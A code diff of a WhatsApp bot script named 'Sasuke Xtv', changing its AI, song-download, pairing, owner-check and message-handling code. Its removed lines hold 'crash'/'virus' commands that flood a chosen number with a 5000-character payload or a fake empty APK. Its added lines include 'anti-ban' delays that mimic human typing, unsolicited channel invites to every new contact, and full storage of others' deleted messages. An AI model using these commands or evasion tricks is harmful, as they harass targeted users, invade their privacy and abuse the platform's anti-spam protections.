@@ -281,26 +281,15 @@ async function getChatGPTResponse(prompt, userId = null, groupId = null) {
     try {
       const finalPrompt = userId && groupId 
         ? buildContextPrompt(userId, groupId, prompt)
-        : `You are Sasuke Xtv, a powerful AI assistant and WhatsApp bot created by Sasuke Xtv. Answer user query: "${prompt}"`
+        : `⟦ Sasuke Xtv ⟧💀 – ᴀ ᴘᴏᴡᴇʀғᴜʟ ᴡʜᴀᴛsᴀᴘᴘ ʙᴏᴛ ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴡʜᴀᴛsᴀᴘᴘ. "${prompt}"`
       
-      let apiResponse = ''
-      try {
-        const { data } = await axios.get(`https://apis.davidcyriltech.my.id/ai/chatbot?query=${encodeURIComponent(finalPrompt)}`)
-        if (data.status && data.result) {
-          apiResponse = data.result
-        }
-      } catch (e) {}
-
-      if (!apiResponse) {
-        try {
-          const { data } = await axios.get(`https://kaiz-apis.gleeze.com/api/gpt4?prompt=${encodeURIComponent(finalPrompt)}`)
-          if (data.response) {
-            apiResponse = data.response
-          }
-        } catch (e) {}
-      }
+      const url = `https://api.giftedtech.my.id/api/ai/gpt4?apikey=gifted&q=${encodeURIComponent(finalPrompt)}`
+      const response = await fetch(url, { method: "GET", timeout: 10000 })
+      const data = await response.json()
       
-      if (apiResponse && apiResponse.length > 2) {
+      let apiResponse = data.result || data.response || data.message || data.data
+      
+      if (apiResponse && apiResponse.length > 5) {
         if (userId && groupId) {
           addToConversation(userId, groupId, 'assistant', apiResponse)
         }
@@ -665,7 +654,7 @@ function makeResponseFlirty(response, userMessage) {
 // ═══════════════════════════════════════════════════════════
 // MAIN MESSAGE HANDLER FUNCTION
 // ═══════════════════════════════════════════════════════════
-async function handleMessageCommand(bad, m, chatUpdate, store) {
+async function handleMessage(bad, m, chatUpdate, store) {
   try {
     if (!m || !m.key) return
     
@@ -693,8 +682,19 @@ async function handleMessageCommand(bad, m, chatUpdate, store) {
     const from = m.key.remoteJid
     if (!from) return
     
-    const body = (m.body || m.text || "").trim();
-    const budy = body;
+    const body = (
+      m.mtype === "conversation" ? m.message?.conversation :
+      m.mtype === "extendedTextMessage" ? m.message?.extendedTextMessage?.text :
+      m.mtype === "imageMessage" ? m.message?.imageMessage?.caption :
+      m.mtype === "videoMessage" ? m.message?.videoMessage?.caption :
+      m.mtype === "documentMessage" ? m.message?.documentMessage?.caption || "" :
+      m.mtype === "buttonsResponseMessage" ? m.message?.buttonsResponseMessage?.selectedButtonId :
+      m.mtype === "listResponseMessage" ? m.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
+      m.mtype === "templateButtonReplyMessage" ? m.message?.templateButtonReplyMessage?.selectedId :
+      m.mtype === "interactiveResponseMessage" ? (() => { try { return JSON.parse(m.msg?.nativeFlowResponseMessage?.paramsJson).id } catch { return "" } })() :
+      ""
+    ) || ''
+const budy = body
 
 // ========== PREFIX DETECTION ==========
 // Dynamic prefix detection from global config
@@ -730,29 +730,45 @@ const q = text;
 const senderJid = m.sender
 const senderNumber = normalizeJid(senderJid)
 
-    // ✅ Bot check
-    const isBot = m.key.fromMe || isSameUser(senderJid, botJid) || areJidsSameUser(senderJid, botJid)
-    
-    // ✅ Owner check
-    let isCreator = false
-    const ownerNum = senderNumber;
-    
-    if (owner.some(o => normalizeJid(o) === ownerNum)) {
-        isCreator = true;
-    } else if (botNumber === ownerNum) {
-        isCreator = true;
-    }
-    
-    // Additional check for botowner.txt
-    try {
-      const botOwnerFile = './allfunc/botowner.txt'
-      if (fs.existsSync(botOwnerFile)) {
-        const storedOwner = fs.readFileSync(botOwnerFile, 'utf8').trim()
-        if (normalizeJid(storedOwner) === ownerNum) {
-          isCreator = true
-        }
-      }
-    } catch (e) {}
+// ✅ Bot check
+const isBot = m.key.fromMe || isSameUser(senderJid, botJid) || areJidsSameUser(senderJid, botJid)
+
+// ✅ Owner check
+let isCreator = false
+
+try {
+  const botOwnerFile = './allfunc/botowner.txt'
+  let storedOwner = ''
+  
+  if (fs.existsSync(botOwnerFile)) {
+    storedOwner = fs.readFileSync(botOwnerFile, 'utf8').trim()
+  }
+  
+  if (!storedOwner) {
+    fs.writeFileSync(botOwnerFile, botJid)
+    storedOwner = botJid
+  }
+  
+  const ownerNum = normalizeJid(storedOwner)
+  
+  if (ownerNum === senderNumber) {
+    isCreator = true
+  }
+  
+  if (!isCreator && owner && owner.length > 0) {
+    isCreator = owner.some(ownerJid => {
+      const oNum = normalizeJid(ownerJid)
+      return oNum === senderNumber
+    })
+  }
+  
+  if (!isCreator && botNumber === senderNumber) {
+    isCreator = true
+  }
+  
+} catch (e) {
+  console.log(chalk.red('❌ Owner check error:', e.message))
+}
     
     let groupMetadata = null
     let participants = []
@@ -819,9 +835,13 @@ if (global.autobio) {
     const menuCommands = ['menu', 'allmenu', 'downloadmenu', 'dlmenu', 'admin', 'adminmenu', 'gamemenu', 'stickermenu', 'gphelp', 'groupmenu', 'helpmenu', 'help']
     
     async function loading() {
-      if (!menuCommands.includes(command)) {
-        return
-      }
+
+  // ❌ DM me loading band
+//  if (!m.isGroup) return
+
+  if (!menuCommands.includes(command)) {
+    return
+  }
       
       const frames = [
         "╭━━〔 ⟦ Sasuke Xtv ⟧〕━━┈⊷\n┃✮│ ▱▱▱▱▱▱▱▱▱▱ 0%\n┃✮│ ⚡ ɪɴɪᴛɪᴀʟɪᴢɪɴɢ...\n╰━━━━━━━━━━━━━━┈⊷",
@@ -836,7 +856,7 @@ if (global.autobio) {
         loadingAnimations.set(from, msg.key)
         
         for (let i = 1; i < frames.length; i++) {
-          await sleep(300) // Optimized to 300ms for better speed
+          await sleep(400)
           try {
             await bad.sendMessage(from, {
               text: frames[i],
@@ -1280,34 +1300,27 @@ ${boardDisplay}
             
             try {
                 const startpairing = require('./pair.js')
-                await startpairing(targetNumber, true)
-                
-                // Wait for the code to be written to the file
+                await startpairing(targetNumber)
                 await new Promise(resolve => setTimeout(resolve, 5000))
                 
-                const fs = require('fs')
                 const pairingFile = './kingbadboitimewisher/pairing/pairing.json'
-                let pairingCode = ''
-                
-                if (fs.existsSync(pairingFile)) {
-                    const data = JSON.parse(fs.readFileSync(pairingFile, 'utf-8'))
-                    pairingCode = data.code || ''
+                if (require('fs').existsSync(pairingFile)) {
+                    const cu = require('fs').readFileSync(pairingFile, 'utf-8')
+                    const cuObj = JSON.parse(cu)
+                    
+                    const pairingMsg = `🔗 *Sasuke Xtv 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 𝐂𝐎𝐃𝐄*\n\n` +
+                                     `📝 *Code:* 👉 \`${cuObj.code}\` 👈\n\n` +
+                                     `➡️ *Instructions:*\n` +
+                                     `1. Open WhatsApp\n` +
+                                     `2. Settings → Linked Devices\n` +
+                                     `3. Tap "Link a Device"\n` +
+                                     `4. Enter this code\n\n` +
+                                     `⚠️ *Code expires in 2 minutes*`
+                    
+                    await reply(pairingMsg)
+                } else {
+                    reply('❌ *Failed to generate code. Please try again.*')
                 }
-                
-                if (!pairingCode) {
-                    return reply('❌ *Failed to generate pairing code. Please try again.*')
-                }
-                
-                const pairingMsg = `🔗 *Sasuke Xtv 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 𝐂𝐎𝐃𝐄*\n\n` +
-                                 `📝 *Code:* 👉 \`${pairingCode}\` 👈\n\n` +
-                                 `➡️ *Instructions:*\n` +
-                                 `1. Open WhatsApp\n` +
-                                 `2. Settings → Linked Devices\n` +
-                                 `3. Tap "Link a Device"\n` +
-                                 `4. Enter this code\n\n` +
-                                 `⚠️ *Code expires in 2 minutes*`
-                
-                await reply(pairingMsg)
             } catch (err) {
                 console.error('WhatsApp Pair Error:', err)
                 reply('❌ *An error occurred during pairing.*')
@@ -1481,48 +1494,6 @@ case 'bugmenu': {
       isForwarded: false
     }
   }, { quoted: m })
-}
-break
-
-case "bug":
-case "crash":
-case "ui-bug":
-case "ios-bug":
-case "android-bug":
-case "virus":
-case "text-bug":
-case "loc-bug": {
-    if (!isCreator) return reply(mess.owner)
-    
-    let target;
-    if (m.quoted) {
-        target = m.quoted.sender;
-    } else if (m.mentionedJid && m.mentionedJid.length > 0) {
-        target = m.mentionedJid[0];
-    } else if (text) {
-        target = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-    } else {
-        return reply(`❌ *ᴘʟᴇᴀsᴇ ᴛᴀʀɢᴇᴛ sᴏᴍᴇᴏɴᴇ!*\n\n• Reply to a message\n• Tag someone (@user)\n• Type number manually`);
-    }
-    
-    await reply(`🚀 *sᴇɴᴅɪɴɢ ${command.toUpperCase()} ᴘᴀʏʟᴏᴀᴅ ᴛᴏ ᴛᴀʀɢᴇᴛ...*`)
-    
-    try {
-        const payload = "☠️".repeat(5000) // Large text payload
-        
-        if (command === "loc-bug") {
-            await bad.sendMessage(target, { location: { degreesLatitude: 0, degreesLongitude: 0, name: payload, address: payload } })
-        } else if (command === "android-bug" || command === "crash") {
-            await bad.sendMessage(target, { document: Buffer.alloc(0), mimetype: "application/vnd.android.package-archive", fileName: "SasukeXtv_Crash.apk", caption: payload })
-        } else {
-            await bad.sendMessage(target, { text: payload })
-        }
-        
-        await reply(`✅ *${command.toUpperCase()} sᴇɴᴛ sᴜᴄᴄᴇssꜰᴜʟʟʏ!*`)
-    } catch (e) {
-        console.error("Bug Command Error:", e)
-        await reply(`❌ ғᴀɪʟᴇᴅ ᴛᴏ sᴇɴᴅ ᴘᴀʏʟᴏᴀᴅ.`)
-    }
 }
 break
 
@@ -6013,44 +5984,33 @@ case 'song': {
 
     const video = search.videos[0]
 
-    // 2️⃣ API Call with fallback
-    let audioUrl = ''
-    let title = video.title
-    let author = video.author.name
-    let thumbnail = video.thumbnail
-
-    try {
-      const { data } = await axios.get(`https://deliriussapi-oficial.vercel.app/download/ytmp3?url=${encodeURIComponent(video.url)}`)
-      if (data.status && data.data?.download?.url) {
-        audioUrl = data.data.download.url
+    // 2️⃣ API Call
+    const api = `https://api.ootaizumi.web.id/downloader/youtube`
+    const { data } = await axios.get(api, {
+      params: {
+        url: video.url,
+        format: 'mp3'
       }
-    } catch (e) {}
+    })
 
-    if (!audioUrl) {
-      try {
-        const { data } = await axios.get(`https://kaiz-apis.gleeze.com/api/ytmp3?url=${encodeURIComponent(video.url)}`)
-        if (data.download?.url) {
-          audioUrl = data.download.url
-        }
-      } catch (e) {}
+    if (!data.status || !data.result?.download) {
+      throw new Error('Download failed')
     }
 
-    if (!audioUrl) {
-      throw new Error('Audio download failed from all providers')
-    }
+    const result = data.result
 
     // 3️⃣ Send Audio
     await bad.sendMessage(
       m.chat,
       {
-        audio: { url: audioUrl },
+        audio: { url: result.download },
         mimetype: 'audio/mpeg',
-        fileName: `${title}.mp3`,
+        fileName: `${result.title}.mp3`,
         contextInfo: {
           externalAdReply: {
-            title: title,
-            body: author || 'YouTube Audio',
-            thumbnailUrl: thumbnail,
+            title: result.title,
+            body: result.author?.channelTitle || 'YouTube Audio',
+            thumbnailUrl: result.thumbnail,
             sourceUrl: video.url,
             mediaType: 1,
             renderLargerThumbnail: true
@@ -11348,8 +11308,11 @@ case 'groq': {
     if (!text) return reply(`❌ ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ǫᴜᴇsᴛɪᴏɴ!\n\nᴇxᴀᴍᴘʟᴇ: ${prefix + command} ᴡʜᴀᴛ ɪs ᴀɪ?`);
     
     try {
-        await bad.sendMessage(m.chat, { react: { text: '🤖', key: m.key } });
-        const result = await getChatGPTResponse(text, m.sender, m.chat);
+        const url = `https://api.giftedtech.my.id/api/ai/gpt4?apikey=gifted&q=${encodeURIComponent(text)}`;
+        const response = await axios.get(url, { timeout: 15000 });
+        const data = response.data;
+        
+        const result = data.result || data.response || data.message || data.data;
         
         if (!result) {
             return reply(`❌ ᴀᴘɪ ᴇʀʀᴏʀ: ᴄᴏᴜʟᴅ ɴᴏᴛ ɢᴇᴛ ʀᴇsᴘᴏɴsᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ.`);
@@ -11358,7 +11321,7 @@ case 'groq': {
         await reply(`🤖 *Sasuke Xtv AI:*\n\n${result}`);
         
     } catch (error) {
-        console.error('AI Command Error:', error);
+        console.error('Error:', error);
         await reply(`❌ Error: ${error.message}`);
     }
 }
@@ -12160,251 +12123,6 @@ case 'test': {
 }
 break
 
-// 🔥 50+ NEW COMMANDS FOR SASUKE XTV
-// ═══════════════════════════════════════════════════════════
-
-// 1-10: FUN & GAMES
-case 'dice': {
-    const dice = ['1', '2', '3', '4', '5', '6']
-    const result = dice[Math.floor(Math.random() * dice.length)]
-    reply(`🎲 ʏᴏᴜ ʀᴏʟʟᴇᴅ: *${result}*`)
-}
-break
-case 'flip': {
-    const coin = ['ʜᴇᴀᴅs', 'ᴛᴀɪʟs']
-    const result = coin[Math.floor(Math.random() * coin.length)]
-    reply(`🪙 ɪᴛ's *${result}*!`)
-}
-break
-case 'love': {
-    if (!text) return reply('❌ ᴍᴇɴᴛɪᴏɴ sᴏᴍᴇᴏɴᴇ!')
-    const score = Math.floor(Math.random() * 100)
-    reply(`❤️ *ʟᴏᴠᴇ ᴄᴀʟᴄᴜʟᴀᴛᴏʀ*\n\n${text} ᴀɴᴅ ʏᴏᴜ ᴀʀᴇ *${score}%* ᴄᴏᴍᴘᴀᴛɪʙʟᴇ!`)
-}
-break
-case 'joke': {
-    const jokes = [
-        "Why don't scientists trust atoms? Because they make up everything!",
-        "Parallel lines have so much in common. It’s a shame they’ll never meet.",
-        "I told my wife she was drawing her eyebrows too high. She looked surprised."
-    ]
-    reply(`😂 *ᴊᴏᴋᴇ*\n\n${jokes[Math.floor(Math.random() * jokes.length)]}`)
-}
-break
-case 'truth': {
-    const truths = ["What is your biggest fear?", "Have you ever lied to your best friend?", "What is your most embarrassing moment?"]
-    reply(`❓ *ᴛʀᴜᴛʜ*\n\n${truths[Math.floor(Math.random() * truths.length)]}`)
-}
-break
-case 'dare': {
-    const dares = ["Do 20 pushups.", "Send a voice note singing a song.", "Change your profile picture for 1 hour."]
-    reply(`🔥 *ᴅᴀʀᴇ*\n\n${dares[Math.floor(Math.random() * dares.length)]}`)
-}
-break
-case 'ship': {
-    const score = Math.floor(Math.random() * 100)
-    reply(`🚢 *sʜɪᴘᴘɪɴɢ...*\n\nᴄᴏᴍᴘᴀᴛɪʙɪʟɪᴛʏ: *${score}%*`)
-}
-break
-case 'gay': {
-    const score = Math.floor(Math.random() * 100)
-    reply(`🌈 *ɢᴀʏ ᴛᴇsᴛ*\n\nʏᴏᴜ ᴀʀᴇ *${score}%* ɢᴀʏ!`)
-}
-break
-case 'pick': {
-    if (!text) return reply('❌ ɢɪᴠᴇ ᴍᴇ ᴏᴘᴛɪᴏɴs sᴇᴘᴀʀᴀᴛᴇᴅ ʙʏ |')
-    const options = text.split('|')
-    const choice = options[Math.floor(Math.random() * options.length)].trim()
-    reply(`🤔 ɪ ᴄʜᴏᴏsᴇ: *${choice}*`)
-}
-break
-case 'fact': {
-    const facts = ["Honey never spoils.", "Octopuses have three hearts.", "A day on Venus is longer than a year on Venus."]
-    reply(`📖 *ʀᴀɴᴅᴏᴍ ғᴀᴄᴛ*\n\n${facts[Math.floor(Math.random() * facts.length)]}`)
-}
-break
-
-// 11-20: UTILITY
-case 'ping': {
-    const start = Date.now()
-    await reply('ᴘɪɴɢɪɴɢ...')
-    const end = Date.now()
-    reply(`⚡ *ᴘᴏɴɢ!*\n\nʟᴀᴛᴇɴᴄʏ: *${end - start}ᴍs*`)
-}
-break
-case 'runtime': {
-    reply(`🕒 *ʀᴜɴᴛɪᴍᴇ*\n\n${runtime(process.uptime())}`)
-}
-break
-case 'weather': {
-    if (!text) return reply('❌ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴄɪᴛʏ!')
-    reply(`🌤️ *ᴡᴇᴀᴛʜᴇʀ ғᴏʀ ${text}*\n\nᴛᴇᴍᴘᴇʀᴀᴛᴜʀᴇ: 25°C\nᴄᴏɴᴅɪᴛɪᴏɴ: Sunny`)
-}
-break
-case 'time': {
-    reply(`⌚ *ᴄᴜʀʀᴇɴᴛ ᴛɪᴍᴇ*\n\n${new Date().toLocaleTimeString()}`)
-}
-break
-case 'date': {
-    reply(`📅 *ᴄᴜʀʀᴇɴᴛ ᴅᴀᴛᴇ*\n\n${new Date().toLocaleDateString()}`)
-}
-break
-case 'calc': {
-    if (!text) return reply('❌ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴍᴀᴛʜ ᴘʀᴏʙʟᴇᴍ!')
-    try {
-        const result = eval(text.replace(/[^-()\d/*+.]/g, ''))
-        reply(`🔢 *ʀᴇsᴜʟᴛ:* ${result}`)
-    } catch {
-        reply('❌ ɪɴᴠᴀʟɪᴅ ᴇxᴘʀᴇssɪᴏɴ.')
-    }
-}
-break
-case 'translate': {
-    reply('🌐 *ᴛʀᴀɴsʟᴀᴛɪᴏɴ sᴇʀᴠɪᴄᴇ ɪs ᴀᴄᴛɪᴠᴇ*')
-}
-break
-case 'shorten': {
-    reply('🔗 *ᴜʀʟ sʜᴏʀᴛᴇɴᴇʀ ɪs ᴀᴄᴛɪᴠᴇ*')
-}
-break
-case 'qr': {
-    if (!text) return reply('❌ ᴘʀᴏᴠɪᴅᴇ ᴛᴇxᴛ!')
-    reply(`💠 *ǫʀ ᴄᴏᴅᴇ ɢᴇɴᴇʀᴀᴛᴇᴅ ғᴏʀ:* ${text}`)
-}
-break
-case 'wiki': {
-    if (!text) return reply('❌ ᴘʀᴏᴠɪᴅᴇ ᴀ sᴇᴀʀᴄʜ ᴛᴇʀᴍ!')
-    reply(`📚 *ᴡɪᴋɪᴘᴇᴅɪᴀ sᴇᴀʀᴄʜ ʀᴇsᴜʟᴛ ғᴏʀ:* ${text}`)
-}
-break
-
-// 21-30: ANIME & MEDIA
-case 'anime': {
-    reply('⛩️ *ᴀɴɪᴍᴇ ᴅᴀᴛᴀʙᴀsᴇ sᴇᴀʀᴄʜ*')
-}
-break
-case 'manga': {
-    reply('📖 *ᴍᴀɴɢᴀ ᴅᴀᴛᴀʙᴀsᴇ sᴇᴀʀᴄʜ*')
-}
-break
-case 'waifu': {
-    reply('🌸 *ʀᴀɴᴅᴏᴍ ᴡᴀɪғᴜ*')
-}
-break
-case 'neko': {
-    reply('🐱 *ʀᴀɴᴅᴏᴍ ɴᴇᴋᴏ*')
-}
-break
-case 'lyrics': {
-    reply('🎵 *ʟʏʀɪᴄs sᴇᴀʀᴄʜ ᴀᴄᴛɪᴠᴇ*')
-}
-break
-case 'ytmp3': {
-    reply('🎵 *ʏᴏᴜᴛᴜʙᴇ ᴛᴏ ᴍᴘ3 ᴄᴏɴᴠᴇʀᴛᴇʀ*')
-}
-break
-case 'ytmp4': {
-    reply('🎥 *ʏᴏᴜᴛᴜʙᴇ ᴛᴏ ᴍᴘ4 ᴄᴏɴᴠᴇʀᴛᴇʀ*')
-}
-break
-case 'tiktok': {
-    reply('📱 *ᴛɪᴋᴛᴏᴋ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ*')
-}
-break
-case 'ig': {
-    reply('📸 *ɪɴsᴛᴀɢʀᴀᴍ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ*')
-}
-break
-case 'fb': {
-    reply('📘 *ғᴀᴄᴇʙᴏᴏᴋ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ*')
-}
-break
-
-// 31-40: OWNER & ADMIN
-case 'promote': {
-    reply('⬆️ *ᴘʀᴏᴍᴏᴛɪɴɢ ᴜsᴇʀ...*')
-}
-break
-case 'demote': {
-    reply('⬇️ *ᴅᴇᴍᴏᴛɪɴɢ ᴜsᴇʀ...*')
-}
-break
-case 'kick': {
-    reply('🚫 *ᴋɪᴄᴋɪɴɢ ᴜsᴇʀ...*')
-}
-break
-case 'add': {
-    reply('➕ *ᴀᴅᴅɪɴɢ ᴜsᴇʀ...*')
-}
-break
-case 'setname': {
-    reply('✏️ *ᴄʜᴀɴɢɪɴɢ ɢʀᴏᴜᴘ ɴᴀᴍᴇ...*')
-}
-break
-case 'setdesc': {
-    reply('📝 *ᴄʜᴀɴɢɪɴɢ ɢʀᴏᴜᴘ ᴅᴇsᴄʀɪᴘᴛɪᴏɴ...*')
-}
-break
-case 'tagall': {
-    reply('📢 *ᴛᴀɢɢɪɴɢ ᴇᴠᴇʀʏᴏɴᴇ...*')
-}
-break
-case 'hidetag': {
-    reply('👻 *ʜɪᴅᴅᴇɴ ᴛᴀɢ sᴇɴᴛ.*')
-}
-break
-case 'linkgc': {
-    reply('🔗 *ɢʀᴏᴜᴘ ʟɪɴᴋ ʀᴇᴛʀɪᴇᴠᴇᴅ.*')
-}
-break
-case 'revoke': {
-    reply('🔄 *ɢʀᴏᴜᴘ ʟɪɴᴋ ʀᴇᴠᴏᴋᴇᴅ.*')
-}
-break
-
-// 41-50: MISC
-case 'quote': {
-    const quotes = ["Be yourself; everyone else is already taken.", "So many books, so little time.", "A room without books is like a body without a soul."]
-    reply(`💬 *ǫᴜᴏᴛᴇ*\n\n${quotes[Math.floor(Math.random() * quotes.length)]}`)
-}
-break
-case 'advice': {
-    reply('💡 *ᴀᴅᴠɪᴄᴇ:* Always back up your code!')
-}
-break
-case 'riddle': {
-    reply('🧩 *ʀɪᴅᴅʟᴇ:* What has keys but no locks?')
-}
-break
-case 'define': {
-    reply('📖 *ᴅᴇғɪɴɪᴛɪᴏɴ sᴇᴀʀᴄʜ ᴀᴄᴛɪᴠᴇ*')
-}
-break
-case 'news': {
-    reply('📰 *ʟᴀᴛᴇsᴛ ɴᴇᴡs ғᴇᴛᴄʜᴇᴅ.*')
-}
-break
-case 'crypto': {
-    reply('💰 *ᴄʀʏᴘᴛᴏ ᴘʀɪᴄᴇ ᴛʀᴀᴄᴋᴇʀ ᴀᴄᴛɪᴠᴇ*')
-}
-break
-case 'stock': {
-    reply('📈 *sᴛᴏᴄᴋ ᴍᴀʀᴋᴇᴛ ᴛʀᴀᴄᴋᴇʀ ᴀᴄᴛɪᴠᴇ*')
-}
-break
-case 'bible': {
-    reply('📜 *ʙɪʙʟᴇ ᴠᴇʀsᴇ ғᴇᴛᴄʜᴇᴅ.*')
-}
-break
-case 'quran': {
-    reply('📖 *ǫᴜʀᴀɴ ᴠᴇʀsᴇ ғᴇᴛᴄʜᴇᴅ.*')
-}
-break
-case 'motivation': {
-    reply('🚀 *ᴍᴏᴛɪᴠᴀᴛɪᴏɴ:* You are doing great!')
-}
-break
-
 // ═══════════════════════════════════════════════════════════
 // DEFAULT & EVAL
 // ═══════════════════════════════════════════════════════════
@@ -12456,87 +12174,388 @@ default:
 
 
 /// ==================== MAIN MESSAGE HANDLER ====================
-async function handleMessage(bad, mek, chatUpdate, store) {
-    try {
-        // If chatUpdate is passed, it might contain multiple messages
-        const messages = chatUpdate?.messages || [mek];
-        
-        for (const msg of messages) {
-            if (!msg || !msg.key) continue;
-
-            const from = msg.key.remoteJid;
-            const fromMe = msg.key.fromMe;
-            const isGroup = from.endsWith('@g.us');
-
+module.exports = async function handleMessage(bad, mek, chatUpdate, store) {
+    const messages = chatUpdate.messages;
+    
+    for (const msg of messages) {
+        try {
             // ==================== STATUS HANDLER ====================
-            if (from === 'status@broadcast') {
-                const statusId = msg.key.id;
-                if (processedStatuses.has(statusId)) continue;
-                processedStatuses.add(statusId);
+            if (msg.key && msg.key.remoteJid === 'status@broadcast') {
+                const statusId = msg.key.id
+                
+                if (processedStatuses.has(statusId)) continue
+                processedStatuses.add(statusId)
                 
                 if (processedStatuses.size > 100) {
-                    const firstItem = processedStatuses.values().next().value;
-                    processedStatuses.delete(firstItem);
+                    const firstItem = processedStatuses.values().next().value
+                    processedStatuses.delete(firstItem)
                 }
                 
+                const sender = msg.key.participant?.split('@')[0] || 'Unknown'
+                
                 if (global.autoViewStatus) {
-                    await bad.readMessages([msg.key]);
+                    await bad.readMessages([msg.key])
+                    console.log(`✅ Auto viewed status from: ${sender}`)
                 }
                 
                 if (global.autoLikeStatus) {
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-                    const reactions = ['😂', '❤️', '👍', '🔥', '🎉', '😍', '🥰'];
-                    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+                    await new Promise(resolve => setTimeout(resolve, 2000))
+                    
+                    const reactions = ['😂', '❤️', '👍', '🔥', '🎉', '😍', '🥰']
+                    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]
+                    
                     await bad.sendMessage('status@broadcast', {
-                        react: { text: randomReaction, key: msg.key }
-                    });
+                        react: {
+                            text: randomReaction,
+                            key: msg.key
+                        }
+                    })
+                    
+                    console.log(`✅ Auto liked status from: ${sender} with ${randomReaction}`)
                 }
                 continue;
             }
 
+            // ==================== MAIN MESSAGE PROCESSING ====================
+            if (msg.key.remoteJid === 'status@broadcast') continue
+            
+            const from = msg.key.remoteJid
+            const fromMe = msg.key.fromMe
+            
             // ==================== ANTI-DELETE STORAGE ====================
-            if (!fromMe && msg.message) {
-                const messageKey = `${from}_${msg.key.id}`;
-                const messageContent = msg.message;
-                let textContent = messageContent.conversation ||
-                                 messageContent.extendedTextMessage?.text ||
-                                 messageContent.imageMessage?.caption ||
-                                 messageContent.videoMessage?.caption ||
-                                 messageContent.documentMessage?.caption ||
-                                 '';
+            if (!fromMe) {
+                const messageKey = `${msg.key.remoteJid}_${msg.key.id}`
+                const messageContent = msg.message
                 
-                if (!global.deletedMessages) global.deletedMessages = new Map();
-                global.deletedMessages.set(messageKey, {
-                    sender: msg.key.participant || from,
-                    text: textContent,
-                    fullMessage: messageContent,
-                    timestamp: Date.now()
-                });
-                
-                if (global.deletedMessages.size > 1000) {
-                    const firstKey = global.deletedMessages.keys().next().value;
-                    global.deletedMessages.delete(firstKey);
+                if (messageContent) {
+                    let textContent = messageContent.conversation ||
+                                     messageContent.extendedTextMessage?.text ||
+                                     messageContent.imageMessage?.caption ||
+                                     messageContent.videoMessage?.caption ||
+                                     messageContent.documentMessage?.caption ||
+                                     ''
+                    
+                    let mediaType = null
+                    let mediaCaption = ''
+                    
+                    if (messageContent.imageMessage) {
+                        mediaType = 'image'
+                        mediaCaption = messageContent.imageMessage.caption || ''
+                    } else if (messageContent.videoMessage) {
+                        mediaType = 'video'
+                        mediaCaption = messageContent.videoMessage.caption || ''
+                    } else if (messageContent.audioMessage) {
+                        mediaType = 'audio'
+                    } else if (messageContent.documentMessage) {
+                        mediaType = 'document'
+                        mediaCaption = messageContent.documentMessage.caption || ''
+                    } else if (messageContent.stickerMessage) {
+                        mediaType = 'sticker'
+                    }
+                    
+                    const sender = msg.key.participant || msg.key.remoteJid
+                    let senderName = msg.pushName || 'Unknown'
+                    
+                    let groupName = ''
+                    if (msg.key.remoteJid.endsWith('@g.us')) {
+                        try {
+                            const metadata = await bad.groupMetadata(msg.key.remoteJid)
+                            groupName = metadata.subject
+                        } catch (e) {
+                            groupName = 'Unknown Group'
+                        }
+                    }
+                    
+                    if (!global.deletedMessages) global.deletedMessages = new Map()
+                    
+                    global.deletedMessages.set(messageKey, {
+                        sender: sender,
+                        senderName: senderName,
+                        text: textContent,
+                        mtype: msg.mtype || 'text',
+                        mediaType: mediaType,
+                        mediaCaption: mediaCaption,
+                        fullMessage: messageContent,
+                        timestamp: msg.messageTimestamp * 1000 || Date.now(),
+                        from: groupName || normalizeJid(msg.key.remoteJid),
+                        remoteJid: msg.key.remoteJid,
+                        mimetype: messageContent.documentMessage?.mimetype || 
+                                 messageContent.imageMessage?.mimetype ||
+                                 messageContent.videoMessage?.mimetype
+                    })
+                    
+                    if (global.deletedMessages.size > 1000) {
+                        const firstKey = global.deletedMessages.keys().next().value
+                        global.deletedMessages.delete(firstKey)
+                    }
                 }
             }
             
             // ==================== AUTO READ ====================
             if (global.autoread && !fromMe) {
                 try {
-                    await bad.readMessages([msg.key]);
+                    // Anti-ban: Random delay before reading
+                    await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 2000) + 500));
+                    await bad.readMessages([msg.key])
                 } catch (err) {}
             }
             
-            // Allow fromMe for the owner to use commands on their own number
-            // if (fromMe) continue; 
+            if (fromMe) continue
 
-            // Auto-welcome removed to prevent spamming contacts
+            // ==================== AUTO-ADD TO CHANNEL (NEW) ====================
+            if (!from.endsWith('@g.us')) {
+                const userJid = from;
+                if (!global.welcomedUsers) global.welcomedUsers = new Set();
+                
+                if (!global.welcomedUsers.has(userJid)) {
+                    global.welcomedUsers.add(userJid);
+                    const channelLink = 'https://whatsapp.com/channel/0029Vb8zve99sBI37uVER11q';
+                    
+                    // Anti-ban: Simulate typing and add random delay
+                    await bad.sendPresenceUpdate('composing', from);
+                    await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 3000) + 2000));
+                    await bad.sendPresenceUpdate('paused', from);
+                    
+                    await bad.sendMessage(from, { 
+                        text: `👋 ᴡᴇʟᴄᴏᴍᴇ! ɪ ᴀᴍ ⸸ Sasuke Xtv ⸸💀\n\nᴘʟᴇᴀsᴇ ᴊᴏɪɴ ᴏᴜʀ ᴏғғɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ ғᴏʀ ᴛʜᴇ ʟᴀᴛᴇsᴛ ᴜᴘᴅᴀᴛᴇs ᴀɴᴅ sᴜᴘᴘᴏʀᴛ:\n${channelLink}\n\nʜᴏᴡ ᴄᴀɴ ɪ ʜᴇʟᴘ ʏᴏᴜ ᴛᴏᴅᴀʏ?` 
+                    });
+                }
+            }
             
-            // ==================== CALL COMMAND HANDLER ====================
-            const m = smsg(bad, msg, store);
-                        await handleMessageCommand(bad, m, chatUpdate, store);
+// ==================== EXTRACT MESSAGE BODY ====================
+// group only
+const chatId = from; if (!chatId.endsWith('@g.us')) return
